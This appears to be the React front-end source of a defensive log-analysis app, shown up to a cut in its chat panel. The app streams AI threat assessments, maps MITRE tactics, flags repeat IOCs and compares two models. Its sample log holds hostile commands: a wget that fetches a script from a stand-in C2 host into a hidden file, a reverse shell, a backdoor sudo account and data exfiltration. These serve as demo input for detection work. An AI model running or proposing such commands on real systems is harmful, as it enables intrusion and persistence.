/**
 * AI Threat Analyzer — Production App
 * Design: matches high-fidelity mockup
 * Features: streaming · AI chat · multi-model compare · confidence · IOC matching
 */

import { useState, useEffect, useRef } from 'react';
import {
  LineChart, Line, BarChart, Bar, PieChart, Pie, Cell,
  XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer,
} from 'recharts';
import { supabase, getToken } from './lib/supabase.js';

const API = import.meta.env.VITE_API_URL || '';

// ── Design tokens matching mockup ────────────────────────────
const COLORS = {
  primary:   '#185FA5',
  primaryLt: '#E6F1FB',
  danger:    '#A32D2D',
  dangerLt:  '#FCEBEB',
  warning:   '#854F0B',
  warningLt: '#FAEEDA',
  success:   '#3B6D11',
  successLt: '#EAF3DE',
  footer:    '#2C3E50',
  border:    'rgba(0,0,0,0.1)',
};

const MITRE_TACTICS = [
  'Reconnaissance','Resource Dev','Initial Access','Execution',
  'Persistence','Priv Escalation','Defense Evasion','Cred Access',
  'Discovery','Lateral Movement','Collection','C2','Exfiltration','Impact',
];

const PRESET_TAGS = ['APT','Ransomware','Phishing','Malware','Insider','Exfiltration','Lateral Movement','Zero Day','Brute Force'];

// Risk helpers
function riskColor(score) {
  if (score >= 70) return COLORS.danger;
  if (score >= 40) return COLORS.warning;
  return COLORS.success;
}
function riskBg(score) {
  if (score >= 70) return COLORS.dangerLt;
  if (score >= 40) return COLORS.warningLt;
  return COLORS.successLt;
}
function riskLabel(score) {
  if (score >= 70) return 'Critical';
  if (score >= 40) return 'Medium';
  return 'Low';
}
function sevColor(sev) {
  const s = (sev||'').toUpperCase();
  if (s==='CRITICAL') return COLORS.danger;
  if (s==='HIGH') return '#993C1D';
  if (s==='MEDIUM') return COLORS.warning;
  return COLORS.success;
}
function sevBg(sev) {
  const s = (sev||'').toUpperCase();
  if (s==='CRITICAL') return COLORS.dangerLt;
  if (s==='HIGH') return '#FAECE7';
  if (s==='MEDIUM') return COLORS.warningLt;
  return COLORS.successLt;
}

const SAMPLE = `2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=22   proto=TCP  count=847
2024-01-15 02:18:47 SSH FAIL   src=185.220.101.47  user=admin  dst=10.0.1.5
2024-01-15 02:19:22 SSH SUCCESS src=185.220.101.47 user=deploy dst=10.0.1.5 session=44291
2024-01-15 02:19:28 PROCESS pid=9934 user=deploy cmd="wget http://malware-c2.ru/stage2.sh -O /tmp/.hidden_update"
2024-01-15 02:19:28 DNS QUERY src=10.0.1.5 query=malware-c2.ru type=A response=91.108.4.14
2024-01-15 02:19:33 SYSLOG WARN msg="Privilege escalation via CVE-2023-0386 process gained root"
2024-01-15 02:19:35 NETWORK dst=91.108.4.14 src=10.0.1.5 port=4444 state=ESTABLISHED msg="Reverse shell"
2024-01-15 02:19:38 PROCESS user=root cmd="useradd -m -s /bin/bash -G sudo svc_backup"
2024-01-15 02:20:03 SSH SUCCESS src=10.0.1.5 user=ubuntu dst=10.0.1.12 msg="Lateral movement"
2024-01-15 02:21:19 NETWORK dst=91.108.4.14 src=10.0.1.12 port=443 bytes=94732180 msg="90.3MB exfiltrated"`;

async function apiFetch(path, opts = {}) {
  const token = await getToken();
  const res = await fetch(`${API}${path}`, {
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(opts.headers || {}),
    },
    ...opts,
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
  return data;
}

function getSharedId() {
  return new URLSearchParams(window.location.search).get('r') || null;
}

// ══════════════════════════════════════════════════════════════
// DESIGN COMPONENTS
// ══════════════════════════════════════════════════════════════

// Shield logo — matches mockup
function ShieldLogo({ size = 28 }) {
  return (
    <svg width={size} height={size} viewBox="0 0 28 28" fill="none">
      <path d="M14 3L4 7v8c0 5.5 4.3 10.7 10 12 5.7-1.3 10-6.5 10-12V7L14 3z"
        fill={COLORS.primary} fillOpacity="0.15" stroke={COLORS.primary} strokeWidth="1.5" />
      <path d="M10 14l3 3 5-5" stroke={COLORS.primary} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

// Network node hero background SVG
function NetworkBg() {
  return (
    <svg style={{ position:'absolute', top:0, right:0, opacity:0.06, pointerEvents:'none', zIndex:0 }}
      width="420" height="320" viewBox="0 0 420 320" fill="none">
      {[[60,80],[160,40],[280,90],[360,30],[200,160],[320,200],[80,200],[400,140],[140,260],[380,280],[240,300]].map(([x,y],i) => (
        <circle key={i} cx={x} cy={y} r="4" fill={COLORS.primary} />
      ))}
      {[[60,80,160,40],[160,40,280,90],[280,90,360,30],[160,40,200,160],[280,90,200,160],[200,160,320,200],[80,200,200,160],[320,200,400,140],[80,200,140,260],[320,200,380,280],[140,260,240,300],[240,300,380,280]].map(([x1,y1,x2,y2],i) => (
        <line key={i} x1={x1} y1={y1} x2={x2} y2={y2} stroke={COLORS.primary} strokeWidth="0.8" />
      ))}
    </svg>
  );
}

// Severity badge — matches mockup pill style
function SevBadge({ level, score }) {
  const label = score !== undefined ? riskLabel(score) : (level || '');
  const color = score !== undefined ? riskColor(score) : sevColor(level);
  const bg    = score !== undefined ? riskBg(score)    : sevBg(level);
  return (
    <span style={{ display:'inline-flex', alignItems:'center', gap:4, fontSize:11, fontWeight:500,
      padding:'2px 8px', borderRadius:99, background:bg, color }}>
      <span style={{ width:6, height:6, borderRadius:'50%', background:color, display:'inline-block' }} />
      {label}
    </span>
  );
}

// Threat score card — main visual from mockup
function ThreatCard({ title, score, bullets = [], model }) {
  const color = riskColor(score);
  const bg    = riskBg(score);
  return (
    <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
      <div style={{ display:'flex', alignItems:'flex-start', justifyContent:'space-between', marginBottom:16 }}>
        <div>
          <p style={{ fontSize:12, color:'#888', marginBottom:4, textTransform:'uppercase', letterSpacing:'0.06em' }}>Threat score</p>
          <span style={{ fontSize:48, fontWeight:500, lineHeight:1, color }}>{score}</span>
          <span style={{ fontSize:13, color:'#aaa', marginLeft:4 }}>/ 100</span>
        </div>
        <SevBadge score={score} />
      </div>
      <div style={{ height:4, background:bg, borderRadius:2, marginBottom:16 }}>
        <div style={{ width:`${score}%`, height:'100%', background:color, borderRadius:2, transition:'width 0.8s ease' }} />
      </div>
      <p style={{ fontSize:13, fontWeight:500, marginBottom:10, color:'#1a1a2e' }}>{title}</p>
      <ul style={{ fontSize:13, color:'#555', lineHeight:1.8, listStyle:'none', padding:0 }}>
        {bullets.map((b, i) => (
          <li key={i} style={{ display:'flex', gap:8, alignItems:'baseline' }}>
            <span style={{ color, fontSize:16, lineHeight:1 }}>•</span>{b}
          </li>
        ))}
      </ul>
      {model && <p style={{ fontSize:11, color:'#aaa', marginTop:10 }}>Model: {model}</p>}
    </div>
  );
}

// IOC pill
function IOCPill({ label, value, type = 'danger' }) {
  const colors = {
    danger:  [COLORS.dangerLt,  COLORS.danger],
    warning: [COLORS.warningLt, COLORS.warning],
    info:    [COLORS.primaryLt, COLORS.primary],
  }[type] || [COLORS.dangerLt, COLORS.danger];
  return (
    <div style={{ display:'flex', alignItems:'center', gap:6 }}>
      <span style={{ fontSize:11, color:'#888' }}>{label}</span>
      <code style={{ fontSize:11, background:colors[0], color:colors[1], padding:'2px 8px', borderRadius:4, fontFamily:'monospace' }}>
        {value}
      </code>
    </div>
  );
}

// Code block — matches mockup
function CodeBlock({ lines = [], pills = [], title, badge }) {
  const [copied, setCopied] = useState(false);
  function copy() {
    navigator.clipboard.writeText(lines.join('\n'));
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }
  return (
    <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
      <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:14, flexWrap:'wrap', gap:8 }}>
        <div style={{ display:'flex', alignItems:'center', gap:10 }}>
          {title && <p style={{ fontSize:13, fontWeight:500, color:'#1a1a2e' }}>{title}</p>}
          {badge && <span style={{ fontSize:11, fontWeight:500, padding:'2px 8px', borderRadius:99, background:COLORS.dangerLt, color:COLORS.danger }}>{badge}</span>}
        </div>
        <button onClick={copy} style={{ background:'transparent', border:`0.5px solid ${COLORS.border}`, borderRadius:8,
          padding:'5px 10px', fontSize:12, cursor:'pointer', color:'#555', display:'flex', alignItems:'center', gap:5 }}>
          <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
            <rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5" />
            <path d="M11 5V3a1 1 0 00-1-1H3a1 1 0 00-1 1v7a1 1 0 001 1h2" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
          </svg>
          {copied ? 'Copied!' : 'Copy'}
        </button>
      </div>
      <pre style={{ background:'#F5F7FA', border:`0.5px solid ${COLORS.border}`, borderRadius:8, padding:16,
        fontSize:12, overflowX:'auto', lineHeight:1.7, margin:0, color:'#1a1a2e', fontFamily:'monospace' }}>
        <code>{lines.join('\n')}</code>
      </pre>
      {pills.length > 0 && (
        <div style={{ display:'flex', gap:16, marginTop:14, flexWrap:'wrap' }}>
          {pills.map((p, i) => <IOCPill key={i} {...p} />)}
        </div>
      )}
    </div>
  );
}

// Confidence bar
function ConfBar({ value, label }) {
  const color = value >= 80 ? COLORS.success : value >= 60 ? COLORS.primary : value >= 40 ? COLORS.warning : COLORS.danger;
  return (
    <div style={{ display:'flex', alignItems:'center', gap:8 }}>
      {label && <span style={{ fontSize:12, color:'#888', width:70, flexShrink:0 }}>{label}</span>}
      <div style={{ flex:1, height:4, background:'#eee', borderRadius:2, overflow:'hidden' }}>
        <div style={{ width:`${value||0}%`, height:'100%', background:color, borderRadius:2, transition:'width 0.7s ease' }} />
      </div>
      <span style={{ fontSize:12, fontWeight:500, color, width:36, textAlign:'right', flexShrink:0, fontFamily:'monospace' }}>{value||0}%</span>
    </div>
  );
}

// Toast notification
function Toast({ message, type, onClose }) {
  useEffect(() => { const t = setTimeout(onClose, 4000); return () => clearTimeout(t); }, []);
  const bg = type==='success' ? COLORS.successLt : type==='error' ? COLORS.dangerLt : COLORS.primaryLt;
  const color = type==='success' ? COLORS.success : type==='error' ? COLORS.danger : COLORS.primary;
  return (
    <div style={{ position:'fixed', top:16, right:16, zIndex:1000, display:'flex', alignItems:'center', gap:12,
      padding:'12px 16px', borderRadius:12, border:`0.5px solid ${color}33`, background:bg, color,
      fontSize:14, maxWidth:360, boxShadow:'0 4px 12px rgba(0,0,0,0.1)' }}>
      <span>{type==='success'?'✓':type==='error'?'✗':'ℹ'}</span>
      <span style={{ flex:1 }}>{message}</span>
      <button onClick={onClose} style={{ background:'none', border:'none', cursor:'pointer', color, fontSize:18, lineHeight:1, padding:0 }}>×</button>
    </div>
  );
}

// Tag editor
function TagEditor({ scanId, initialTags = [], onUpdate }) {
  const [tags, setTags] = useState(initialTags);
  const [saving, setSaving] = useState(false);
  async function toggle(tag) {
    const next = tags.includes(tag) ? tags.filter(t => t !== tag) : [...tags, tag];
    setTags(next); setSaving(true);
    try { await apiFetch(`/api/scans/${scanId}/tags`, { method:'PATCH', body:JSON.stringify({ tags:next }) }); onUpdate?.(next); }
    catch(_) {} setSaving(false);
  }
  return (
    <div>
      <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:10 }}>
        <span style={{ fontSize:12, color:'#888', textTransform:'uppercase', letterSpacing:'0.06em' }}>Labels</span>
        {saving && <span style={{ fontSize:11, color:'#aaa' }}>saving…</span>}
      </div>
      <div style={{ display:'flex', flexWrap:'wrap', gap:6 }}>
        {PRESET_TAGS.map(tag => (
          <button key={tag} onClick={() => toggle(tag)}
            style={{ padding:'4px 12px', borderRadius:99, fontSize:12, fontWeight:500, cursor:'pointer',
              border:`0.5px solid ${tags.includes(tag) ? COLORS.primary : COLORS.border}`,
              background: tags.includes(tag) ? COLORS.primaryLt : 'transparent',
              color: tags.includes(tag) ? COLORS.primary : '#555',
              transition:'all 0.15s' }}>
            {tag}
          </button>
        ))}
      </div>
    </div>
  );
}

// Share button
function ShareBtn({ scanId, isPublic:init, onToast }) {
  const [isPublic, setIsPublic] = useState(init || false);
  const [loading, setLoading] = useState(false);
  async function toggle() {
    setLoading(true);
    try {
      const d = await apiFetch(`/api/scans/${scanId}/share`, { method:'PATCH' });
      setIsPublic(d.is_public);
      if (d.is_public) { await navigator.clipboard.writeText(`${window.location.origin}?r=${scanId}`); onToast('Shareable link copied!', 'success'); }
      else onToast('Report is now private.', 'info');
    } catch(e) { onToast(e.message, 'error'); }
    setLoading(false);
  }
  async function copy() { await navigator.clipboard.writeText(`${window.location.origin}?r=${scanId}`); onToast('Link copied!', 'success'); }
  return (
    <div style={{ display:'flex', gap:6 }}>
      <button onClick={toggle} disabled={loading}
        style={{ display:'flex', alignItems:'center', gap:6, padding:'6px 12px', borderRadius:8, fontSize:12, fontWeight:500, cursor:'pointer',
          border:`0.5px solid ${isPublic ? COLORS.success : COLORS.border}`,
          background: isPublic ? COLORS.successLt : 'transparent',
          color: isPublic ? COLORS.success : '#555' }}>
        {loading ? '…' : isPublic ? '🔗 Public' : '🔒 Private'}
      </button>
      {isPublic && (
        <button onClick={copy} style={{ padding:'6px 12px', borderRadius:8, fontSize:12, cursor:'pointer',
          border:`0.5px solid ${COLORS.border}`, background:'transparent', color:'#555' }}>
          Copy link
        </button>
      )}
    </div>
  );
}

// IOC matches banner
function IOCBanner({ scanId }) {
  const [matches, setMatches] = useState([]);
  const [loaded, setLoaded] = useState(false);
  useEffect(() => {
    if (!scanId) { setLoaded(true); return; }
    apiFetch(`/api/scans/${scanId}/matches`).then(d => setMatches(d.matches||[])).catch(()=>{}).finally(()=>setLoaded(true));
  }, [scanId]);
  if (!loaded || matches.length === 0) return null;
  return (
    <div style={{ background:COLORS.warningLt, border:`0.5px solid ${COLORS.warning}44`, borderRadius:12, padding:16, marginBottom:16 }}>
      <div style={{ display:'flex', gap:12, alignItems:'flex-start' }}>
        <span style={{ fontSize:20, flexShrink:0 }}>🔁</span>
        <div style={{ flex:1 }}>
          <p style={{ fontWeight:500, fontSize:13, color:COLORS.warning, marginBottom:4 }}>
            {matches.length} repeat IOC{matches.length>1?'s':''} detected — possible persistent threat
          </p>
          <div style={{ display:'flex', flexDirection:'column', gap:6, marginTop:8 }}>
            {matches.map((m,i) => (
              <div key={i} style={{ display:'flex', alignItems:'center', gap:8, background:'rgba(255,255,255,0.6)', borderRadius:8, padding:'6px 10px' }}>
                <code style={{ fontSize:11, background:COLORS.warningLt, color:COLORS.warning, padding:'2px 8px', borderRadius:4 }}>{m.ioc_type}</code>
                <code style={{ fontSize:11, color:COLORS.warning, flex:1, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{m.ioc_value}</code>
                <span style={{ fontSize:11, color:COLORS.warning, flexShrink:0 }}>
                  Seen {m.hit_count}× · first {new Date(m.first_seen).toLocaleDateString('en-IN')}
                </span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// MITRE matrix
function MitreMatrix({ mappings = [] }) {
  const byTactic = {};
  mappings.forEach(m => { if (!byTactic[m.tactic]) byTactic[m.tactic]=[]; byTactic[m.tactic].push(m); });
  return (
    <div style={{ overflowX:'auto', paddingBottom:4 }}>
      <div style={{ display:'flex', gap:6, minWidth:'max-content' }}>
        {MITRE_TACTICS.map(tactic => {
          const hits = byTactic[tactic]||[], active=hits.length>0;
          return (
            <div key={tactic} style={{ width:68, flexShrink:0 }}>
              <div style={{ textAlign:'center', padding:'6px 2px', fontSize:9, fontWeight:600, lineHeight:1.2, borderRadius:'6px 6px 0 0',
                background: active ? `${COLORS.primary}20` : '#F5F7FA',
                color: active ? COLORS.primary : '#aaa',
                border: active ? `0.5px solid ${COLORS.primary}44` : `0.5px solid ${COLORS.border}`,
                borderBottom:'none' }}>
                {tactic}
              </div>
              <div style={{ minHeight:32, padding:3, display:'flex', flexDirection:'column', gap:2, borderRadius:'0 0 6px 6px',
                background: active ? `${COLORS.primary}08` : '#fafafa',
                border: active ? `0.5px solid ${COLORS.primary}44` : `0.5px solid ${COLORS.border}`,
                borderTop:'none' }}>
                {hits.map((h,i) => (
                  <div key={i} title={`${h.name} — ${h.confidence}%${h.evidence ? '\n'+h.evidence : ''}`}
                    style={{ textAlign:'center', padding:'2px 0', borderRadius:3, cursor:'help', fontSize:9,
                      background:`${COLORS.primary}20`, color:COLORS.primary, fontFamily:'monospace', fontWeight:600,
                      border:`0.5px solid ${COLORS.primary}30` }}>
                    {h.technique}
                  </div>
                ))}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// Streaming analysis loader
function StreamLoader({ input, onComplete, onError }) {
  const [chunks, setChunks] = useState('');
  const [status, setStatus] = useState('streaming');
  const bottomRef = useRef();

  useEffect(() => {
    (async () => {
      try {
        const token = await getToken();
        const res = await fetch(`${API}/api/analyze/stream`, {
          method:'POST',
          headers:{ 'Content-Type':'application/json', ...(token?{Authorization:`Bearer ${token}`}:{}) },
          body: JSON.stringify({ input }),
        });
        if (!res.ok) { const e=await res.json(); throw new Error(e.error||'Stream failed'); }
        const reader=res.body.getReader(); const decoder=new TextDecoder(); let buffer='';
        while(true){
          const{done,value}=await reader.read(); if(done)break;
          buffer+=decoder.decode(value,{stream:true});
          const lines=buffer.split('\n'); buffer=lines.pop();
          for(const line of lines){
            if(!line.startsWith('data: '))continue;
            try{
              const data=JSON.parse(line.slice(6));
              if(data.type==='chunk'){setChunks(t=>t+data.text);bottomRef.current?.scrollIntoView({behavior:'smooth'});}
              if(data.type==='done'){setStatus('done');setTimeout(()=>onComplete(data.result,data.scanId),600);}
              if(data.type==='error')throw new Error(data.message);
            }catch(_){}
          }
        }
      }catch(err){onError(err.message||'Analysis failed.');}
    })();
  }, []);

  const pct = Math.min(98, Math.round(chunks.length/1800*100));
  return (
    <div style={{ padding:'32px 0' }}>
      <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:8 }}>
        <div style={{ display:'flex', alignItems:'center', gap:8 }}>
          <span style={{ width:8, height:8, borderRadius:'50%', background: status==='done' ? COLORS.success : COLORS.primary,
            display:'inline-block', animation: status!=='done' ? 'pulse 1.2s ease-in-out infinite' : 'none' }} />
          <span style={{ fontSize:13, color:'#555' }}>{status==='done'?'Analysis complete ✓':'AI is analysing your logs…'}</span>
        </div>
        <span style={{ fontSize:12, color:'#aaa', fontFamily:'monospace' }}>{chunks.length} chars</span>
      </div>
      <div style={{ height:3, background:'#eee', borderRadius:2, marginBottom:16, overflow:'hidden' }}>
        <div style={{ width: status==='done'?'100%':`${pct}%`, height:'100%', background:COLORS.primary,
          borderRadius:2, transition:'width 0.4s ease' }} />
      </div>
      <div style={{ background:'#1a1a2e', borderRadius:10, overflow:'hidden' }}>
        <div style={{ display:'flex', alignItems:'center', gap:6, padding:'8px 14px', background:'rgba(255,255,255,0.04)', borderBottom:'0.5px solid rgba(255,255,255,0.08)' }}>
          <span style={{ width:10, height:10, borderRadius:'50%', background:'#FF5A5F' }} />
          <span style={{ width:10, height:10, borderRadius:'50%', background:'#FFBD2E' }} />
          <span style={{ width:10, height:10, borderRadius:'50%', background:'#27C93F' }} />
          <span style={{ fontSize:11, color:'rgba(255,255,255,0.35)', marginLeft:8, fontFamily:'monospace' }}>llama-3.3-70b — live output</span>
        </div>
        <div style={{ padding:16, fontFamily:'monospace', fontSize:12, lineHeight:1.7, maxHeight:240, overflowY:'auto', minHeight:100 }}>
          <span style={{ color:'#7EC8A0' }}>{chunks}</span>
          {status!=='done' && <span style={{ color:COLORS.primary, animation:'blink 1s step-end infinite' }}>▋</span>}
          <div ref={bottomRef} />
        </div>
      </div>
    </div>
  );
}

// Multi-model compare runner
function CompareRunner({ input, onBack }) {
  const [status, setStatus] = useState('loading');
  const [models, setModels] = useState([]);
  const [error, setError] = useState('');

  useEffect(() => {
    (async () => {
      try {
        const token = await getToken();
        const res = await fetch(`${API}/api/analyze/compare`, {
          method:'POST',
          headers:{ 'Content-Type':'application/json', ...(token?{Authorization:`Bearer ${token}`}:{}) },
          body: JSON.stringify({ input }),
        });
        const reader=res.body.getReader(); const decoder=new TextDecoder(); let buffer='';
        while(true){
          const{done,value}=await reader.read(); if(done)break;
          buffer+=decoder.decode(value,{stream:true});
          const lines=buffer.split('\n'); buffer=lines.pop();
          for(const line of lines){
            if(!line.startsWith('data: '))continue;
            try{
              const data=JSON.parse(line.slice(6));
              if(data.type==='done'){setModels(data.models);setStatus('done');}
              if(data.type==='error')throw new Error(data.message);
            }catch(_){}
          }
        }
      }catch(err){setError(err.message);setStatus('error');}
    })();
  }, []);

  if(status==='loading') return (
    <div style={{ padding:'64px 0', textAlign:'center' }}>
      <div style={{ fontSize:40, marginBottom:16 }}>⚔️</div>
      <p style={{ fontWeight:500, color:'#1a1a2e', marginBottom:6 }}>Running both models in parallel…</p>
      <p style={{ fontSize:13, color:'#888' }}>Llama 3.3 70B vs Mixtral 8x7B</p>
    </div>
  );
  if(status==='error') return (
    <div style={{ padding:24, textAlign:'center' }}>
      <p style={{ color:COLORS.danger, marginBottom:16 }}>{error}</p>
      <button onClick={onBack} style={btnOutline}>← Back</button>
    </div>
  );

  const [m1,m2]=models;
  const agree=m1?.result?.severity===m2?.result?.severity;
  return (
    <div>
      <div style={{ padding:'12px 16px', borderRadius:10, marginBottom:20,
        background: agree ? COLORS.successLt : COLORS.warningLt,
        border:`0.5px solid ${agree ? COLORS.success : COLORS.warning}44` }}>
        <p style={{ fontWeight:500, fontSize:13, color: agree ? COLORS.success : COLORS.warning }}>
          {agree ? '✓ Both models agree on severity' : '⚠ Models disagree on severity — review carefully'}
        </p>
        <p style={{ fontSize:12, color:'#666', marginTop:2 }}>
          Risk score difference: {Math.abs((m1?.result?.riskScore||0)-(m2?.result?.riskScore||0))} points
        </p>
      </div>

      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16, marginBottom:16 }}>
        {models.map((model,i) => model.result ? (
          <div key={i} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
            <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:12, paddingBottom:12,
              borderBottom:`0.5px solid ${COLORS.border}` }}>
              <div>
                <span style={{ fontSize:13, fontWeight:500, color: i===0?COLORS.primary:'#7F77DD' }}>{model.label}</span>
                {i===0 && <span style={{ marginLeft:6, fontSize:10, background:COLORS.primaryLt, color:COLORS.primary,
                  padding:'1px 6px', borderRadius:99 }}>Primary</span>}
              </div>
              <SevBadge level={model.result.severity} />
            </div>
            <div style={{ display:'flex', alignItems:'center', gap:16, marginBottom:12 }}>
              <div style={{ textAlign:'center' }}>
                <div style={{ fontSize:36, fontWeight:500, color:riskColor(model.result.riskScore||0), lineHeight:1 }}>
                  {model.result.riskScore}
                </div>
                <div style={{ fontSize:11, color:'#aaa' }}>/ 100</div>
              </div>
              <div style={{ flex:1 }}>
                <ConfBar value={model.result.confidence||0} label="Confidence" />
              </div>
            </div>
            <p style={{ fontSize:12, color:'#555', lineHeight:1.6 }}>{model.result.summary}</p>
          </div>
        ) : (
          <div key={i} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
            <p style={{ color:COLORS.danger, fontSize:13 }}>{model.error || 'Model failed'}</p>
          </div>
        ))}
      </div>

      {m1?.result && m2?.result && (
        <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, overflow:'hidden', marginBottom:16 }}>
          <div style={{ padding:'12px 20px', borderBottom:`0.5px solid ${COLORS.border}` }}>
            <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e' }}>Side-by-side comparison</p>
          </div>
          <table style={{ width:'100%', fontSize:13, borderCollapse:'collapse' }}>
            <thead>
              <tr style={{ background:'#F5F7FA' }}>
                <th style={{ textAlign:'left', padding:'8px 20px', fontSize:11, color:'#888', fontWeight:500, textTransform:'uppercase', letterSpacing:'0.06em' }}>Metric</th>
                <th style={{ textAlign:'center', padding:'8px 20px', fontSize:12, color:COLORS.primary, fontWeight:500 }}>{m1.label}</th>
                <th style={{ textAlign:'center', padding:'8px 20px', fontSize:12, color:'#7F77DD', fontWeight:500 }}>{m2.label}</th>
              </tr>
            </thead>
            <tbody>
              {[['Risk Score',m1.result.riskScore,m2.result.riskScore],['Severity',m1.result.severity,m2.result.severity],
                ['Confidence',`${m1.result.confidence||0}%`,`${m2.result.confidence||0}%`],
                ['IOCs',m1.result.iocs?.length||0,m2.result.iocs?.length||0],
                ['Techniques',m1.result.mitreMapping?.length||0,m2.result.mitreMapping?.length||0],
                ['Timeline events',m1.result.timeline?.length||0,m2.result.timeline?.length||0]
              ].map(([label,v1,v2])=>(
                <tr key={label} style={{ borderTop:`0.5px solid ${COLORS.border}` }}>
                  <td style={{ padding:'8px 20px', color:'#555' }}>{label}</td>
                  <td style={{ padding:'8px 20px', textAlign:'center', fontWeight:500, color:String(v1)!==String(v2)?COLORS.primary:'#1a1a2e' }}>{v1}</td>
                  <td style={{ padding:'8px 20px', textAlign:'center', fontWeight:500, color:String(v1)!==String(v2)?'#7F77DD':'#1a1a2e' }}>{v2}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      <button onClick={onBack} style={btnOutline}>← Back</button>
    </div>
  );
}

// AI Chat panel
function ChatPanel({ scanId }) {
  const [messages, setMessages] = useState([]);
  const [input, setInput] = useState('');
  const [streaming, setStreaming] = useState(false);
  const [loadingHist, setLoadingHist] = useState(true);
  const bottomRef = useRef();

  const QUICK = ['How urgent is this threat?','Explain the lateral movement','What should I do first?','Is this an APT attack?'];

  useEffect(() => {
    if (!scanId) { setLoadingHist(false); return; }
    apiFetch(`/api/chat/${scanId}`).then(d=>setMessages(d.messages||[])).catch(()=>{}).finally(()=>setLoadingHist(false));
  }, [scanId]);

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior:'smooth' }); }, [messages]);

  async function send(q) {
    const question = q || input.trim();
    if (!question || streaming) return;
    setInput(''); setStreaming(true);
    setMessages(prev => [...prev,
      { id:Date.now(), role:'user', content:question },
      { id:Date.now()+1, role:'assistant', content:'', streaming:true }
    ]);
    try {
      const token = await getToken();
      const res = await fetch(`${API}/api/chat/${scanId}/stream`, {
        method:'POST',
        headers:{ 'Content-Type':'application/json', ...(token?{Authorization:`Bearer ${token}`}:{}) },
        body: JSON.stringify({ question }),
      });
      const reader=res.body.getReader(); const decoder=new TextDecoder(); let buffer='', answer='';
      while(true){
        const{done,value}=await reader.read(); if(done)break;
        buffer+=decoder.decode(value,{stream:true});
        const lines=buffer.split('\n'); buffer=lines.pop();
        for(const line of lines){
          if(!line.startsWith('data: '))continue;
          try{
            const data=JSON.parse(line.slice(6));
            if(data.type==='chunk'){answer+=data.text;setMessages(prev=>prev.map((m,i)=>i===prev.length-1?{...m,content:answer}:m));}
            if(data.type==='done'){setMessages(prev=>prev.map((m,i)=>i===prev.length-1?{...m,streaming:false}:m));}
          }catch(_){}
        }
      }
    }catch(err){setMessages(prev=>prev.map((m,i)=>i===prev.length-1?{...m,content:'Something went wrong. Please try again.',streaming:false}:m));}
    setStreaming(false);
  }

  return (
    <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, display:'flex', flexDirection:'column', height:520 }}>
      <div style={{ padding:'16px 20px', borderBottom:`0.5px solid ${COLORS.border}`, display:'flex', alignItems:'center', gap:12 }}>
        <div style={{ width:32, height:32, borderRadius:8, background:COLORS.primaryLt, display:'flex', alignItems:'center', justifyContent:'center', fontSize:16 }}>🤖</div>
        <div style={{ flex:1 }}>
          <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:1 }}>AI threat analyst</p>
          <p style={{ fontSize:12, color:'#888' }}>Ask anything about this incident</p>
        </div>
        <span style={{ width:8, height:8, borderRadius:'50%', background: streaming ? COLORS.primary : COLORS.success }} />
      </div>
      <div style={{ flex:1, overflowY:'auto', padding:16, display:'flex', flexDirection:'column', gap:12 }}>
        {loadingHist ? <p style={{ fontSize:13, color:'#aaa', textAlign:'center', marginTop:16 }}>Loading history…</p>
        : messages.length===0 ? (
          <div style={{ textAlign:'center', paddingTop:24 }}>
            <p style={{ fontSize:14, fontWeight:500, color:'#1a1a2e', marginBottom:6 }}>Ask me anything about this incident</p>
            <p style={{ fontSize:13, color:'#888', marginBottom:20 }}>I have full context of all findings, IOCs, and techniques</p>
            <div style={{ display:'flex', flexWrap:'wrap', gap:8, justifyContent:'center' }}>
              {QUICK.map(q => (
                <button key={q} onClick={() => send(q)}
                  style={{ padding:'6px 14px', borderRadius:99, fontSize:12, cursor:'pointer',
                    background:COLORS.primaryLt, border:`0.5px solid ${COLORS.primary}44`, color:COLORS.primary }}>
                  {q}
                </button>
              ))}
            </div>
          </div>
        ) : (
          <>
            {messages.map((msg,i)=>(
              <div key={msg.id||i} style={{ display:'flex', gap:10, flexDirection:msg.role==='user'?'row-reverse':'row' }}>
                <div style={{ width:28, height:28, borderRadius:'50%', flexShrink:0, display:'flex', alignItems:'center', justifyContent:'center', fontSize:12, fontWeight:500,
                  background: msg.role==='user' ? COLORS.primaryLt : COLORS.successLt,
                  color: msg.role==='user' ? COLORS.primary : COLORS.success, border:`0.5px solid ${msg.role==='user'?COLORS.primary:COLORS.success}33` }}>
                  {msg.role==='user'?'U':'AI'}
                </div>
                <div style={{ maxWidth:'78%', padding:'10px 14px', borderRadius:10, fontSize:13, lineHeight:1.6,
                  background: msg.role==='user' ? COLORS.primaryLt : '#F5F7FA',
                  border:`0.5px solid ${msg.role==='user'?COLORS.primary+'33':COLORS.border}`,
                  color: '#1a1a2e',
